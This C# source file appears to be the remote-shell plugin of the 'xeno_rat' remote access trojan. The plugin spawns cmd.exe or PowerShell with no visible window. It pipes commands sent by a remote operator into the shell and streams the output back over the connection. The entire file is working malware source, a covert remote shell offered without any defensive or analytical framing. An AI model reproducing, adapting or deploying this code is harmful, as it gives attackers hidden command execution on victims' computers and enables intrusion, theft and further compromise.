using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        Process process;
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    if (process!=null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    break;
                }
                if (data[0] == 0)
                {
                    process?.StandardInput.WriteLine(Encoding.UTF8.GetString(await node.ReceiveAsync()));
                }
                else if (data[0]==1)
                {
                    if (process != null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    try
                    {
                        await CreateProc("cmd.exe", node);
                    }
                    catch 
                    { 
                    
                    }
                }
                else if (data[0] == 2)
                {
                    if (process != null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    try
                    {
                        await CreateProc("powershell.exe", node);
                    }
                    catch { }
                }
            }
            if (process != null)
                KillProcessAndChildren(process.Id);
            process?.Close();
            process?.Dispose();
        }
        private static void KillProcessAndChildren(int pid)
        {
            // Cannot close 'system idle process'.
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
                proc.Dispose();
            }
            catch (ArgumentException)
            {
                // Process already exited.
            }
        }
        public async Task CreateProc(string path, Node node) 
        {
            process = new Process();
            process.StartInfo.FileName = path;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.OutputDataReceived += async (sender, e) =>
            {
                if (e.Data != null)
                {
                    await node.SendAsync(Encoding.UTF8.GetBytes(e.Data));
                }
            };

            process.ErrorDataReceived += async (sender, e) =>
            {
                if (e.Data !=null)
                {
                    await node.SendAsync(Encoding.UTF8.GetBytes(e.Data));
                }
            };
            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
        }
    }
}
